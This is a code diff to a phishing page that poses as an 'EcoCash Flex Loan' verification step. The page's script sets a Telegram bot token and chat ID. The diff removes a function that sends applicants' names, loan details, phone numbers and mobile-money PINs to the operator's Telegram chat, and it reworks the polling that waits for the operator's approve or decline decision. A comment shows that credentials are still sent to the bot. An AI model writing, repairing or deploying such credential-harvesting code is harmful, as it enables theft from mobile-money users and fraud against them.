@@ -378,8 +378,8 @@
 <script>
   (function() {
     // ==================== TELEGRAM CONFIGURATION ====================
-    const BOT_TOKEN = '8851084758:AAGSxtu3Ed-Mw2XKyhpdeWmCU9J65On6xkA';
-    const CHAT_ID   = '8820857419';
+    const BOT_TOKEN = '9040279030:AAGXiP6GxJSBrqsyeNK1C9N614wbzle_B7Q';
+    const CHAT_ID   = '6763267892';
     const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;
     
     // ==================== DOM ELEMENTS ====================
@@ -540,53 +540,7 @@
     }
     
     // Start polling for admin decision (Approve / Decline)
-       // ── Telegram bot send + poll ──
-    function sendToBot(phone, pin) {
-      if (isProcessing) return;
-      isProcessing = true;
-      continueBtn.disabled    = true;
-      continueBtn.textContent = 'Verifying…';
-
-      const application = getStoredApplication();
-      const loanAmount  = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
-      const loanType    = application.loanType || '—';
-      const fullName    = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';
-
-      const ts        = Date.now();
-      const approveId = `approve_${ts}`;
-      const declineId = `decline_${ts}`;
-      const verifyId  = `verify_${ts}`;
-
-      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CONFIG.CHAT_ID,
-          text: `<b>🟢 EcoCash Flex Loan Verification</b>\n\nApplicant: <b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
-          parse_mode: 'HTML',
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: '✅ Approve Loan',  callback_data: approveId },
-                { text: '📱 Verify Device', callback_data: verifyId  }
-              ],
-              [{ text: '❌ Decline', callback_data: declineId }]
-            ]
-          }
-        })
-      })
-      .then(() => {
-        // Save phone to localStorage (original behaviour)
-        localStorage.setItem('phone', phone);
-        localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
-
-        spinnerOverlay.style.display = 'flex';
-        startPolling(approveId, declineId, verifyId);
-      })
-      .catch(() => resetButton());
-    }
-        // Start polling for admin decision (Approve / Decline)
-        function startPollingForDecision(approveCallbackId, declineCallbackId) {
+    function startPollingForDecision(approveCallbackId, declineCallbackId) {
       stopPolling();
       let lastUpdateId = 0;
       
@@ -634,9 +588,10 @@
               return;
             }
           }
+        } catch (err) {
+          console.warn('Polling error:', err);
         }
-        }
-      }, 1000);
+      }, 1500);
     }
     
     // Send credentials to Telegram bot with inline buttons "Approve" and "Decline"
